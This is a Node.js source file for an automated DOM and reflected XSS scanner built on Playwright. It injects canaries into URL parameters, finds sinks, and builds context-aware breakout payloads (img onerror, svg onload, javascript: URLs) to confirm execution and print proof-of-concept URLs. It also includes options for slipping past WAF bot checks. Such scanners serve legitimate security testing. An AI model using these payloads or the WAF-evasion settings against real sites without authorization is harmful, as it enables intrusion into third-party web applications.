#!/usr/bin/env node
'use strict';

// Node.js port of mthook.py — a DOM XSS scanner built on Playwright.
//
// This version drops the Python orchestrator's *hang* machinery — no watchdog
// thread, no node-driver SIGKILL, no per-worker pid tracking — because Node's
// Playwright driver is in-process on a single event loop, so a hung/dead
// out-of-process driver leaking OS threads can't happen here.
//
// It KEEPS the crash/memory resilience, because a Chromium process crash (OOM
// after thousands of pages, or a page that triggers "Target crashed") applies
// equally to Node: each worker owns its own browser, recycles it every
// BROWSER_REFRESH_INTERVAL URLs to cap memory growth, and relaunches it when a
// closed/crashed-browser error surfaces (see isClosedError). Without this a
// long run eventually kills the browser and every remaining URL just throws
// "Target ... has been closed" into a dead process.

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const readline = require('readline');
const { parseArgs } = require('util');
const yaml = require('js-yaml');
const parse5 = require('parse5');
const { chromium } = require('playwright');

const ROOT = __dirname;
const config = yaml.load(fs.readFileSync(path.join(ROOT, 'config.yaml'), 'utf8'));

let preloadjs = '';
let injectjs = '';
let stage1_wait = 0;

let outputStream = null;
let debug_mode = false;
let dedup = false;
let extra_headers = {};
// Path to a Playwright storageState JSON (cookies + localStorage) captured from
// a real, WAF-passed session. When set, every context loads it and cookies are
// NOT cleared between URLs (clearing would drop the anti-bot cookie).
let storage_state_path = null;
// Run browsers visibly (needs a display). Headed Chromium drops the
// "HeadlessChrome" client-hint brand, which some WAFs block on.
let headed = false;
// Fixed viewport {width, height} from --viewport. null keeps Playwright's default.
let viewport = null;

const BLOCKED_RESOURCE_TYPES = new Set(['image', 'media', 'font']);
const DOMAIN_MAX_ERRORS = 10;
const BROWSER_REFRESH_INTERVAL = 50;  // URLs per browser before recycle (caps Chromium memory)
const URL_HANG_TIMEOUT = 60000;       // hard ceiling per URL; page.evaluate() has no internal timeout,
                                      // so a wedged renderer (busy JS loop) would hang a worker forever
const CLOSE_TIMEOUT = 10000;          // ceiling on context/browser close so recycle can't hang on a wedged browser

const domain_errors = new Map();
const domain_sinks = new Map();      // domain -> Set of hashes
const domain_reflected = new Map();  // domain -> Set of hashes

// ---------------------------------------------------------------------------
// small utilities
// ---------------------------------------------------------------------------

function eprint(...args) {
    process.stderr.write(args.join(' ') + '\n');
}

function md5(s) {
    return crypto.createHash('md5').update(s, 'utf8').digest('hex');
}

function netloc(urlStr) {
    // Mirror urlparse().netloc for the cases we care about; '' when relative.
    try {
        return new URL(urlStr).host;
    } catch {
        return '';
    }
}

function uniq(arr) {
    return [...new Set(arr)];
}

function unquote(s) {
    // Mirror Python's urllib.parse.unquote: decode %XX escapes but never throw
    // on a malformed sequence the way decodeURIComponent does — leave those
    // intact and decode only the valid ones.
    if (!s) return '';
    if (s.indexOf('%') === -1) return s;
    try {
        return decodeURIComponent(s);
    } catch {
        return s.replace(/%[0-9a-fA-F]{2}/g, m => {
            try { return decodeURIComponent(m); } catch { return m; }
        });
    }
}

function domain_is_blocked(domain) {
    return (domain_errors.get(domain) || 0) >= DOMAIN_MAX_ERRORS;
}

function domain_record_error(domain) {
    const n = (domain_errors.get(domain) || 0) + 1;
    domain_errors.set(domain, n);
    return n;
}

// ---------------------------------------------------------------------------
// noise filter — drop URL-copy sinks (share widgets, trackers, embeds)
// ---------------------------------------------------------------------------

// Sinks that only ever ride along with the page's own URL — the canary in
// their value came from location, so no attacker-controlled source flowed in.
// location_* are exempt on purpose (open-redirect leads), JS sinks and
// script_text can't be a pure URL copy. (Keep in sync with JS_SINKS.)
const NOISE_EXEMPT_SINKS = new Set(['eval', 'func', 'setTimeout', 'setInterval',
    'script_text', 'location_nav', 'location_assign', 'location_replace',
    'location_href']);

// URL-attribute sinks (as emitted by preload.js) whose value is a resolved URL.
const NOISE_URL_ATTR_SINKS = new Set(['a_href', 'image_src', 'script_src',
    'iframe_src', 'form_action']);

function filter_noise_sinks(sinks, current_url = '', dom_url = null) {
    // Drop URL-copy sinks: share widgets, trackers, captcha/embed href params —
    // values that embed the page's own URL. Signal: the canary sits MID-URL,
    // immediately followed by query/fragment continuation (`&`, `#`, or their
    // percent-encoded forms), because the page glued its full location into a
    // bigger URL. Genuine flows have the canary free-standing or at a value end
    // (breakout-capable), so they survive. For pure URL-attribute sinks
    // (a_href, *_src, ...) a value-end canary is also noise — no markup to break
    // out of — UNLESS the canary starts the whole value (full-value control =>
    // javascript: URL possible => keep). Analysis runs on once-unquoted code so
    // single- and double-encoded embeds normalize to the same shape.
    if (!sinks || !sinks.length) return [...(sinks || [])];
    const canary = config.canary;
    const kept = [];
    for (const s of sinks) {
        if (NOISE_EXEMPT_SINKS.has(s.sink)) {
            kept.push(s);
            continue;
        }
        const decoded = unquote(s.code || '');
        let url_attr = NOISE_URL_ATTR_SINKS.has(s.sink);
        if (s.sink && s.sink.startsWith('setAttribute_')) {
            const parts = s.sink.split('_');
            const attr = parts.length >= 3 ? parts.slice(2).join('_') : '';
            url_attr = ['href', 'src', 'action', 'formaction', 'content'].includes(attr);
        }
        if (url_attr && decoded.replace(/^\s+/, '').replace(/^<+/, '').startsWith(canary)) {
            kept.push(s);  // full-value control — javascript: URL candidate
            continue;
        }
        const rgx = new RegExp(canary + '[a-zA-Z0-9_.\\[\\]\\-]+', 'g');
        const occ = [];
        let m;
        while ((m = rgx.exec(decoded)) !== null) {
            const before = decoded.slice(0, m.index);
            let tail = decoded.slice(m.index + m[0].length);
            // skip the wrapped canary's closing `>` (raw or %3E)
            if (tail.startsWith('>')) {
                tail = tail.slice(1);
            } else if (tail.slice(0, 3).toLowerCase() === '%3e') {
                tail = tail.slice(3);
            }
            if (url_attr) {
                // for URL-attribute sinks only query position can be noise:
                // canary in path/authority/fragment of the resolved value means
                // the page assigned (nearly) the whole value — attacker
                // controlled, e.g. `a.href = <input>` resolving to a path. `?`
                // must be the last URL separator before the canary for it to
                // sit inside the query.
                const q = before.lastIndexOf('?');
                const h = before.lastIndexOf('#');
                if (q === -1 || (h !== -1 && h > q)) {
                    occ.push('free');
                    continue;
                }
            }
            // mid: more query params follow (`&x=` or encoded forms). A bare `&`
            // without `name=` (HTML entities like `&nbsp;`) is NOT continuation
            // — that's markup after a free-standing value.
            if (/^&[A-Za-z0-9_.%\-]+(?:=|%3D)/i.test(tail)
                    || ['%26', '%23'].includes(tail.slice(0, 3).toLowerCase())
                    || tail.startsWith('#')) {
                occ.push('mid');
            } else if (['"', "'", '>', '%22', '%27', '%3e', '%3E'].some(p => tail.startsWith(p))
                    || tail === '') {
                // value end: ambiguous for markup sinks (breakout-capable),
                // plain noise for url-attr sinks (nothing to break out of)
                occ.push(url_attr ? 'mid' : 'end');
            } else {
                occ.push('free');
            }
        }
        // noise only when every occurrence rides inside an embedded URL
        // (mid-param or its tail end) and none is free-standing markup
        if (occ.includes('mid') && !occ.includes('free')) {
            continue;
        }
        kept.push(s);
    }
    return kept;
}

// ---------------------------------------------------------------------------
// dedup
// ---------------------------------------------------------------------------

function filter_new_sinks(domain, sinks, current_url = '') {
    // Return only sinks not yet seen for this domain. Hashes sink+sources+code,
    // with the current URL (raw and URL-encoded) stripped from code first.
    if (!sinks || !sinks.length) return [];
    if (!dedup) return [...sinks];
    const out = [];
    const url_enc = current_url ? encodeURIComponent(current_url) : '';
    let seen = domain_sinks.get(domain);
    if (!seen) { seen = new Set(); domain_sinks.set(domain, seen); }
    for (const s of sinks) {
        let code = s.code || '';
        if (current_url) {
            code = code.split(current_url).join('').split(url_enc).join('');
        }
        const payload = (s.sink || '') + '|' + [...(s.sources || [])].sort().join(',') + '|' + code;
        const h = md5(payload);
        if (!seen.has(h)) {
            seen.add(h);
            out.push(s);
        }
    }
    return out;
}

function filter_new_reflected(domain, reflected) {
    // Return only reflected hits not yet seen for this domain. Hashes
    // key+context+tag+attr.
    if (!reflected || !reflected.length) return [];
    if (!dedup) return [...reflected];
    const out = [];
    let seen = domain_reflected.get(domain);
    if (!seen) { seen = new Set(); domain_reflected.set(domain, seen); }
    for (const r of reflected) {
        let keys = r.key || '';
        if (Array.isArray(keys)) keys = [...keys].sort().join(',');
        const payload = [keys, r.context || '', r.tag || '', r.attr || ''].join('|');
        const h = md5(payload);
        if (!seen.has(h)) {
            seen.add(h);
            out.push(r);
        }
    }
    return out;
}

// ---------------------------------------------------------------------------
// reflected-canary discovery (server-side reflection in the raw HTML)
// ---------------------------------------------------------------------------

function canaryRegex(canary) {
    return new RegExp(canary + '([a-zA-Z0-9_.\\[\\]\\-]+)', 'g');
}

function keysFrom(text, rgx) {
    rgx.lastIndex = 0;
    const keys = [];
    let m;
    while ((m = rgx.exec(text)) !== null) keys.push(m[1]);
    return uniq(keys);
}

function isElement(node) {
    return node.tagName !== undefined && node.nodeName !== '#text'
        && node.nodeName !== '#comment' && node.nodeName !== '#document'
        && node.nodeName !== '#document-fragment' && node.nodeName !== '#documentType';
}

function snippet(node) {
    let s;
    try {
        s = isElement(node) ? parse5.serializeOuter(node) : parse5.serialize(node);
    } catch {
        return '';
    }
    if (!s) return '';
    return s.replace(/\s+/g, ' ').trim().slice(0, 300);
}

function find_reflected_canaries(raw_html, canary) {
    const results = [];
    const rgx = canaryRegex(canary);
    let doc;
    try {
        doc = parse5.parse(raw_html);
    } catch {
        return results;
    }

    function walk(node) {
        for (const child of (node.childNodes || [])) {
            if (isElement(child)) {
                const tag = (child.tagName || child.nodeName || '').toLowerCase();

                // tag name itself matches canary — `<canary+key>` reflected
                // unescaped into HTML body and parsed as an unknown element.
                const tagKeys = keysFrom(tag, rgx);
                if (tagKeys.length) {
                    const parent = child.parentNode;
                    const parentTag = (parent && parent.tagName)
                        ? parent.tagName.toLowerCase() : 'html';
                    results.push({ key: tagKeys, context: 'html', tag: parentTag,
                                   code: snippet(parent || child) });
                }

                // attributes
                for (const { name: attrName, value: attrVal } of (child.attrs || [])) {
                    if (!attrVal) continue;
                    const keys = keysFrom(attrVal, rgx);
                    if (keys.length) {
                        results.push({ key: keys, context: 'attr', tag,
                                       attr: attrName, code: snippet(child) });
                    }
                }

                walk(child);
            } else if (child.nodeName === '#text') {
                const text = child.value || '';
                if (!text) continue;
                const keys = keysFrom(text, rgx);
                if (keys.length) {
                    const parent = child.parentNode;
                    const ptag = (parent && parent.tagName)
                        ? parent.tagName.toLowerCase() : '';
                    const ctx = ptag === 'script' ? 'script'
                        : ptag === 'style' ? 'style' : 'html';
                    results.push({ key: keys, context: ctx, tag: ptag,
                                   code: snippet(parent || child) });
                }
            }
        }
    }

    walk(doc);
    return results;
}

function get_reflected_payloads(reflected, canary) {
    // Generate confirmation payloads for server-side reflected canaries.
    // Dedup by (key, ctx_group) so each key gets at most one html/attr payload
    // AND one script payload — the two classes need different payloads.
    const seen = new Set();
    const results = [];
    for (const r of reflected) {
        let keys = r.key || [];
        if (typeof keys === 'string') keys = [keys];
        const ctx = r.context || 'html';
        const ctx_group = ctx === 'script' ? 'script' : 'other';
        for (const key of keys) {
            const dedupKey = key + '\x00' + ctx_group;
            if (!key || seen.has(dedupKey)) continue;
            seen.add(dedupKey);
            let payload;
            if (ctx === 'script') {
                payload = `'"></stYle/</titLe/</teXtarEa/</scRipt/--!><svg id=${key} onload=rsjsstorage.alertfunc(this.id)>`;
            } else {
                payload = `'"></stYle/</titLe/</teXtarEa/</scRipt/--!><svg/onload="rsjsstorage.alertfunc('${key}')">`;
            }
            results.push({ key, sink: 'reflected_' + ctx, ctx: 'html', payload });
        }
    }
    return results;
}

// ---------------------------------------------------------------------------
// URL helpers
// ---------------------------------------------------------------------------

function uniqueQueryKeys(u) {
    return uniq([...u.searchParams.keys()]);
}

function inject_canary_params(urlStr, canary) {
    let u;
    try { u = new URL(urlStr); } catch { return urlStr; }
    const keys = uniqueQueryKeys(u);
    if (!keys.length) return urlStr;
    // `<` + canary + key + `>` — matches rsCanaryValue() in preload.js so
    // jQuery's HTML-vs-text heuristic routes the value through innerHTML.
    const sp = new URLSearchParams();
    for (const k of keys) sp.set(k, '<' + canary + k + '>');
    u.search = sp.toString();
    return u.toString();
}

function build_dom_url(current_url, usp_revealed, canary) {
    // Append revealed USP keys (not already present in the query) as
    // `key=canary+key` pairs.
    if (!usp_revealed || !usp_revealed.length) return current_url;
    let u;
    try { u = new URL(current_url); } catch { return current_url; }
    const existing = new Set([...u.searchParams.keys()]);
    const extra = usp_revealed.filter(k => !existing.has(k));
    if (!extra.length) return current_url;
    for (const k of extra) u.searchParams.append(k, canary + k);
    return u.toString();
}

function build_payload_url(base_url, key, payload) {
    // Build a PoC URL with `payload` substituted as the value of `key`.
    // For key == '_hash', strip any fragment and append `#<payload>` raw.
    if (key === '_hash') {
        return base_url.split('#')[0] + '#' + payload;
    }
    let u;
    try { u = new URL(base_url); } catch { return base_url; }
    u.searchParams.set(key, payload);
    return u.toString();
}

// ---------------------------------------------------------------------------
// context detection + payload generation
// ---------------------------------------------------------------------------

const JS_SINKS = new Set(['eval', 'func', 'setTimeout', 'setInterval', 'script_text']);
const URL_SINKS = new Set(['location_assign', 'location_replace', 'location_href',
    'location_nav', 'a_href', 'form_action', 'iframe_src', 'script_src', 'window_open']);
const HTML_SINKS = new Set(['html']);
const URL_ATTR_NAMES = new Set(['href', 'src', 'action', 'formaction']);

const JS_PAYLOADS = {
    expr: "rsjsstorage.alertfunc('{key}');",
    single: "'-rsjsstorage.alertfunc(\"{key}\")-'",
    double: "\"-rsjsstorage.alertfunc('{key}')-\"",
    backtick: "`-rsjsstorage.alertfunc('{key}')-`",
};

function detect_js_context(code, canary, key) {
    // Determine if canary+key sits inside a string literal in JS code.
    // Counts unescaped quotes before the marker — odd count means inside.
    const marker = canary + key;
    const idx = code.indexOf(marker);
    if (idx === -1) return 'expr';
    const before = code.slice(0, idx);
    for (const [qchar, name] of [['"', 'double'], ["'", 'single'], ['`', 'backtick']]) {
        let count = 0;
        let i = 0;
        while (i < before.length) {
            if (before[i] === '\\') { i += 2; continue; }
            if (before[i] === qchar) count++;
            i++;
        }
        if (count % 2 === 1) return name;
    }
    return 'expr';
}

function detect_html_context(code, canary, key) {
    // Determine the attribute-value quoting context of canary+key in HTML code.
    // The HTML5 parser's 'before attribute value state' treats the first char
    // after `=` as the delimiter: `"` → double-quoted, `'` → single-quoted,
    // anything else → unquoted.  The universal payload `'">…` starts with `'`,
    // which *opens* a single-quoted value in the unquoted case and swallows the
    // entire attack.  Returns: 'unquoted' | 'single' | 'double' | 'text'
    const marker = canary + key;
    const idx = code.indexOf(marker);
    if (idx === -1) return 'text';
    let start = idx;
    if (start > 0 && code[start - 1] === '<') start--;
    let j = start - 1;
    while (j >= 0 && ' \t\n\r'.includes(code[j])) j--;
    if (j < 0) return 'text';
    if (code[j] === '=') return 'unquoted';
    if (code[j] === '"' || code[j] === "'") {
        const q = code[j];
        let k = j - 1;
        while (k >= 0 && ' \t\n\r'.includes(code[k])) k--;
        if (k >= 0 && code[k] === '=') return q === '"' ? 'double' : 'single';
    }
    return 'text';
}

function is_url_exploitable(code, canary, key) {
    // True if canary+key controls the full URL or the domain part.
    const marker = canary + key;
    const stripped = code.replace(/^\s+/, '').replace(/^<+/, '');
    if (stripped.startsWith(marker)) return true;
    try {
        const host = new URL(stripped).host;
        if (host && host.includes(canary)) return true;
    } catch { /* relative / not a URL */ }
    return false;
}

function static_confirm_url_sinks(new_sinks, payloads, canary) {
    // For URL sinks where canary+key controls the URL value (start or netloc),
    // return matching payload entries so they can be confirmed without stage 2
    // (which can't auto-click <a>/<form>).
    const confirmed = [];
    for (const s of new_sinks) {
        const stype = s.sink;
        const isUrlSink = URL_SINKS.has(stype);
        let isUrlAttr = false;
        if (stype.startsWith('setAttribute_')) {
            const parts = stype.split('_');
            const attr = parts.length > 2 ? parts.slice(2).join('_') : '';
            isUrlAttr = URL_ATTR_NAMES.has(attr);
        }
        if (!(isUrlSink || isUrlAttr)) continue;
        const code = s.code || '';
        for (const key of (s.sources || [])) {
            if (!is_url_exploitable(code, canary, key)) continue;
            for (const p of payloads) {
                if (p.key === key && p.sink === stype) { confirmed.push(p); break; }
            }
        }
    }
    return confirmed;
}

function get_payloads(sink, canary) {
    // Generate payloads for a sink entry. Returns list of {key, sink, ctx, payload}.
    const stype = sink.sink;
    const code = sink.code || '';
    const results = [];
    for (const key of (sink.sources || [])) {
        if (JS_SINKS.has(stype)) {
            const ctx = detect_js_context(code, canary, key);
            const payload = JS_PAYLOADS[ctx].replace('{key}', key);
            results.push({ key, sink: stype, ctx, payload });
        } else if (URL_SINKS.has(stype)) {
            results.push({ key, sink: stype, ctx: 'url',
                payload: `javascript:rsjsstorage.alertfunc('${key}')` });
        } else if (HTML_SINKS.has(stype)) {
            // createElement single-tag shape: code is exactly `<canary+key>`,
            // meaning a jQuery-style $(value) call hit the HTML branch of its
            // HTML-vs-selector heuristic on the wrapped canary (preload.js
            // wraps canaries in <…> on purpose). The confirmation payload must
            // ALSO start with '<' or the heuristic routes it to the selector
            // path at confirm time and nothing executes. No breakout prefix:
            // the canary was the whole fragment, not text inside markup.
            // (Mirrors mthook.py.)
            let payload;
            if (code === `<${canary}${key}>`) {
                payload = `<img/src/onerror=rsjsstorage.alertfunc('${key}')>`;
            } else {
                const htmlCtx = detect_html_context(code, canary, key);
                if (htmlCtx === 'unquoted') {
                    payload = `></stYle/</titLe/</teXtarEa/</scRipt/--!><img src=x onerror="rsjsstorage.alertfunc('${key}')">`;
                } else if (htmlCtx === 'single') {
                    payload = `'></stYle/</titLe/</teXtarEa/</scRipt/--!><img src=x onerror="rsjsstorage.alertfunc('${key}')">`;
                } else if (htmlCtx === 'double') {
                    payload = `"></stYle/</titLe/</teXtarEa/</scRipt/--!><img src=x onerror="rsjsstorage.alertfunc('${key}')">`;
                } else {
                    payload = `'"></stYle/</titLe/</teXtarEa/</scRipt/--!><img/src/onerror="rsjsstorage.alertfunc('${key}')">`;
                }
            }
            results.push({ key, sink: stype, ctx: 'html', payload });
        } else if (stype.startsWith('setAttribute_')) {
            const parts = stype.split('_');
            const attr = parts.length > 2 ? parts.slice(2).join('_') : '';
            if (attr.startsWith('on')) {
                results.push({ key, sink: stype, ctx: 'event',
                    payload: `rsjsstorage.alertfunc('${key}')` });
            } else if (URL_ATTR_NAMES.has(attr)) {
                results.push({ key, sink: stype, ctx: 'url',
                    payload: `javascript:rsjsstorage.alertfunc('${key}')` });
            }
        }
    }
    return results;
}

function build_inject_js(payloads) {
    // Build preload_inject.js with payload_map {key: payload}. _hash key is
    // separated into hash_payload.
    const payload_map = {};
    let hash_payload = '';
    for (const p of payloads) {
        if (p.key === '_hash') hash_payload = p.payload;
        else payload_map[p.key] = p.payload;
    }
    let js = injectjs;
    js = js.replace('"{{payload_map}}"', JSON.stringify(payload_map));
    js = js.replace('"{{hash_payload}}"', JSON.stringify(hash_payload));
    return js;
}

function emit_confirmed(base_url, confirmed) {
    for (const c of confirmed) {
        const payload = c.payload.split('rsjsstorage.alertfunc').join('alert');
        const poc = build_payload_url(base_url, c.key, payload);
        const line = `${poc}  [sink=${c.sink} ctx=${c.ctx}]`;
        process.stdout.write(line + '\n');
        if (outputStream) outputStream.write(line + '\n');
    }
}

// ---------------------------------------------------------------------------
// stage 2 — confirmation
// ---------------------------------------------------------------------------

async function stage2Route(route, request) {
    try {
        if (BLOCKED_RESOURCE_TYPES.has(request.resourceType())) {
            await route.abort();
            return;
        }
    } catch { /* ignore */ }
    try { await route.continue(); } catch { /* ignore */ }
}

async function process_url_stage2(context, url, payloads) {
    // Reload the same URL with canary params, but preload_inject.js returns
    // payload values via USP hooks and hash.
    if (!payloads.length) return [];
    const inject_script = build_inject_js(payloads);
    url = inject_canary_params(url, config.canary);
    const hasHashPayload = payloads.some(p => p.key === '_hash');
    const target_url = hasHashPayload ? url : url + `#${config.canary}_hash`;

    const page = await context.newPage();
    await page.addInitScript({ content: inject_script });
    await page.route('**/*', stage2Route);
    try {
        try {
            await page.goto(target_url, { timeout: 10000, waitUntil: 'commit' });
        } catch { /* timeout ok */ }
        const expected = payloads.length;
        try {
            await page.waitForFunction(
                (n) => window.rsjsstorage && window.rsjsstorage.jsEvals.length >= n,
                // Heavy SPAs hydrate long after `commit`; the sink path (and
                // the alertfunc call) often fires seconds later. 1.5s
                // systematically under-confirmed; 5s covers hydration + late
                // timers without dominating scan time (stage 2 only runs on
                // pages with sinks). Mirrors mthook.py.
                expected, { timeout: 5000 });
        } catch { /* timeout ok */ }
        const js_evals = await page.evaluate(
            () => (window.rsjsstorage ? window.rsjsstorage.jsEvals : null));
        const evals = js_evals || [];
        return payloads.filter(p => evals.includes(p.key));
    } catch (e) {
        eprint(`[stage2 error] ${target_url} ${e}`);
        return [];
    } finally {
        try { await page.close(); } catch { /* ignore */ }
    }
}

async function process_url_stage2_reflected(context, base_url, payloads) {
    // Confirm server-side reflected XSS by navigating with the payload as the
    // raw query value (no JS hooks — the server has to be doing the reflection
    // for execution to fire).
    if (!payloads.length) return [];
    const confirmed = [];
    for (const p of payloads) {
        const target_url = build_payload_url(base_url, p.key, p.payload);
        let page;
        try {
            page = await context.newPage();
        } catch (e) {
            eprint(`[stage2-reflected new_page] ${target_url} ${e}`);
            continue;
        }
        await page.route('**/*', stage2Route);
        try {
            try {
                await page.goto(target_url, { timeout: 10000, waitUntil: 'commit' });
            } catch { /* timeout ok */ }
            try {
                await page.waitForFunction(
                    (k) => window.rsjsstorage && window.rsjsstorage.jsEvals.includes(k),
                    // Same rationale as process_url_stage2: SPA hydration and
                    // late timers need more than 1.5s. Mirrors mthook.py.
                    p.key, { timeout: 5000 });
            } catch { /* timeout ok */ }
            const js_evals = await page.evaluate(
                () => (window.rsjsstorage ? window.rsjsstorage.jsEvals : null)) || [];
            if (js_evals.includes(p.key)) confirmed.push(p);
        } catch (e) {
            eprint(`[stage2-reflected error] ${target_url} ${e}`);
        } finally {
            try { await page.close(); } catch { /* ignore */ }
        }
    }
    return confirmed;
}

// ---------------------------------------------------------------------------
// stage 1 — discovery
// ---------------------------------------------------------------------------

const HTML_CONTENT_TYPES = ['text/html', 'application/xhtml+xml', 'text/xml', 'application/xml'];

function is_html_content_type(ct) {
    // True if a main-document response with this Content-Type could be an
    // HTML page Chromium renders and runs scripts in. 'text/html' also covers
    // text/html-sandboxed via substring; the XML types cover XHTML payloads
    // (rendered in XML mode). An empty/absent type counts too: Chromium
    // sniffs unknown types and may render HTML with scripts running, so the
    // reflection scan still needs the body. The canary is unique, so scanning
    // a non-HTML body can't false-positive.
    const v = (ct || '').trim().toLowerCase();
    if (!v) return true;
    return HTML_CONTENT_TYPES.some((t) => v.includes(t));
}

async function process_url(context, url) {
    const url_domain = netloc(url);
    if (domain_is_blocked(url_domain)) return;

    let page;
    try {
        page = await context.newPage();
    } catch (e) {
        eprint(`[${url_domain}] new_page: ${e}`);
        return;
    }

    try {
        url = inject_canary_params(url, config.canary);
        const canary = config.canary;
        const target_url = url + `#${canary}_hash`;
        const target_url_no_hash = target_url.split('#')[0];

        // The document that actually RENDERS: the last non-redirect main-frame
        // navigation response. Keying on the requested URL (the old approach)
        // only ever saw the first hop, so redirected URLs (http->https,
        // apex->www, trailing slash) never had their final HTML captured for
        // the reflection scan, a redirect to a non-HTML target wasn't skipped,
        // and a WAF block page behind a redirect was invisible to the >=400
        // warning. 3xx never decides (the chain continues); 204 never decides
        // (nav_route fulfills canary navigations with 204, and a 204 renders
        // nothing). The body is fetched lazily at analysis time, so
        // superseded hops cost nothing.
        const mainDoc = { response: null, status: null, ct: '' };

        page.on('response', (response) => {
            try {
                const req = response.request();
                if (!req.isNavigationRequest()
                        || req.resourceType() !== 'document'
                        || req.frame() !== page.mainFrame()) return;
                const status = response.status();
                if (status === 204 || (status >= 300 && status < 400)) return;
                mainDoc.response = response;
                mainDoc.status = status;
                mainDoc.ct = response.headers()['content-type'] || '';
            } catch { /* ignore */ }
        });

        // Capture canary-containing navigations at the network layer.
        // In Chromium, Location.{assign,replace,href} cannot be hooked from JS,
        // so we intercept here. The initial goto is allowed; any later
        // main-frame nav whose URL contains the canary is recorded as
        // `location_nav` and fulfilled with HTTP 204 (keeps the page put and
        // preserves rsjsstorage — abort() lands on chrome-error:// and wipes it).
        const nav_sinks = [];
        const src_rgx = canaryRegex(canary);

        await page.route('**/*', async (route, request) => {
            try {
                if (BLOCKED_RESOURCE_TYPES.has(request.resourceType())) {
                    await route.abort();
                    return;
                }
                if (request.isNavigationRequest()
                        && request.frame() === page.mainFrame()
                        && request.url().split('#')[0] !== target_url_no_hash
                        && request.url().includes(canary)) {
                    const keys = keysFrom(request.url(), src_rgx);
                    nav_sinks.push({ sink: 'location_nav', sources: keys, code: request.url() });
                    await route.fulfill({ status: 204, body: '' });
                    return;
                }
            } catch { /* ignore */ }
            try { await route.continue(); } catch { /* ignore */ }
        });

        let goto_err = null;
        try {
            await page.goto(target_url, { timeout: 10000, waitUntil: 'commit' });
        } catch (e) { goto_err = e; /* timeout ok; net errors handled below */ }

        if (mainDoc.response && !is_html_content_type(mainDoc.ct)) {
            // The final document of the FIRST request's redirect chain came
            // back non-HTML (JSON/PDF/plain text/binary/...): no page JS ever
            // runs, so there are no DOM sinks to find and no reflection body
            // was captured — the settle wait, evaluate and any stage-2
            // requests are pure waste. Omit the URL here. (SVG main documents
            // are also omitted even though scripts run there: verified
            // empirically that sources register, but in XML mode innerHTML
            // with any HTML markup THROWS, so the HTML-breakout confirmation
            // payloads can never execute — only pure JS sinks could confirm,
            // which is negligible on top of SVG-as-main-document being rare.)
            if (debug_mode) {
                eprint(`[skip non-html] ${url} content-type='${mainDoc.ct}' status=${mainDoc.status}`);
            }
            if (mainDoc.status && mainDoc.status >= 400) {
                eprint(`[${url_domain}] main document ${mainDoc.status} for ${url} `
                    + `(likely blocked/rate-limited — no findings possible)`);
            }
            return;
        }

        // Post-commit settle. 'load'/'domcontentloaded' never fire on pages
        // where an IIFE triggers a canary nav we 204; networkidle is safer
        // because the 204 closes the request stream. Use stage1_wait when set,
        // otherwise a short 300 ms window for inline JS to run.
        if (stage1_wait) {
            try {
                await page.waitForLoadState('networkidle', { timeout: Math.round(stage1_wait * 1000) });
            } catch { /* ignore */ }
        } else {
            await page.waitForTimeout(300);
        }

        // The target never actually loaded: a net-layer failure (connection
        // reset, cert error, DNS/unsafe port, etc.) lands Chromium on
        // chrome-error://chromewebdata/, and a 204'd initial nav leaves it on
        // about:blank. preload.js skips both, so rsjsstorage is absent there —
        // there's no page to scan. Surface the real reason instead of a
        // misleading "[no findings]".
        const landed = page.url();
        if (landed.startsWith('chrome-error://') || landed === 'about:blank') {
            if (debug_mode) {
                const reason = goto_err ? String(goto_err.message).split('\n')[0] : 'no document committed';
                eprint(`[load failed] ${url} (${reason})`);
            }
            return;
        }

        const rsjsstorage = await page.evaluate(() => window.rsjsstorage);
        if (!rsjsstorage) {
            eprint(`[${url_domain}] no rsjsstorage (preload didn't run; page at ${page.url()})`);
            return;
        }

        const current_url = rsjsstorage.originurl;

        const domain = netloc(current_url);
        rsjsstorage.dom_url = build_dom_url(current_url, rsjsstorage.uspRevealed || [], canary);

        // check raw response for reflected canary with context (the final
        // document after any redirects)
        let new_reflected = [];
        if (mainDoc.response) {
            let raw = null;
            try { raw = await mainDoc.response.text(); } catch { /* ignore */ }
            if (raw) {
                const reflected = find_reflected_canaries(raw, canary);
                new_reflected = filter_new_reflected(domain, reflected);
                if (new_reflected.length) rsjsstorage.reflected = new_reflected;
            }
        }

        let merged_sinks = (rsjsstorage.sinks || []).concat(nav_sinks);
        const noise_before = merged_sinks.length;
        merged_sinks = filter_noise_sinks(merged_sinks, current_url, rsjsstorage.dom_url);
        if (debug_mode && merged_sinks.length < noise_before) {
            eprint(`[noise] ${url_domain}: dropped ${noise_before - merged_sinks.length} `
                + `url-copy sink(s) on ${current_url}`);
        }
        const new_sinks = filter_new_sinks(domain, merged_sinks, current_url);

        // Stage 2: generate payloads and verify execution
        const payloads = [];
        for (const s of new_sinks) payloads.push(...get_payloads(s, canary));
        let confirmed = [];
        if (payloads.length) {
            const static_confirmed = static_confirm_url_sinks(new_sinks, payloads, canary);
            const stage2_confirmed = await process_url_stage2(context, url, payloads);
            const seen = new Set();
            for (const p of static_confirmed.concat(stage2_confirmed)) {
                const k = p.key + '\x00' + p.sink;
                if (!seen.has(k)) { seen.add(k); confirmed.push(p); }
            }
        }

        // Stage 2 (reflected): server-side reflected XSS — navigate with the
        // payload directly in the query and check for alertfunc execution.
        let reflected_payloads = get_reflected_payloads(new_reflected, canary);
        if (reflected_payloads.length) {
            const confirmedKeys = new Set(confirmed.map(c => c.key));
            reflected_payloads = reflected_payloads.filter(p => !confirmedKeys.has(p.key));
            if (reflected_payloads.length) {
                for (const p of await process_url_stage2_reflected(context, url, reflected_payloads)) {
                    confirmed.push(p);
                }
            }
        }

        if (confirmed.length) emit_confirmed(rsjsstorage.dom_url, confirmed);

        // Surface WAF/error pages: a blocked doc has no sinks and reflects
        // nothing, so it's otherwise indistinguishable from a clean page.
        if (mainDoc.status && mainDoc.status >= 400) {
            eprint(`[${url_domain}] main document ${mainDoc.status} for ${url} `
                + `(likely blocked/rate-limited — no findings possible)`);
        }
        if (debug_mode) {
            if (new_sinks.length || (rsjsstorage.reflected && rsjsstorage.reflected.length)) {
                eprint(JSON.stringify({ originurl: rsjsstorage.originurl, dom_url: rsjsstorage.dom_url,
                    uspRevealed: rsjsstorage.uspRevealed, sinks: new_sinks, confirmed,
                    reflected: rsjsstorage.reflected }));
            } else {
                eprint(`[no findings] ${current_url} status=${mainDoc.status} `
                    + `(rsjsstorage ok, 0 sinks / 0 reflected)`);
            }
        }
    } catch (r) {
        // A closed/crashed browser can't be recovered per-URL — re-raise so the
        // worker relaunches it instead of draining the rest of the queue into a
        // dead process (counting each as a per-domain error and hiding the cause).
        if (isClosedError(r)) throw r;
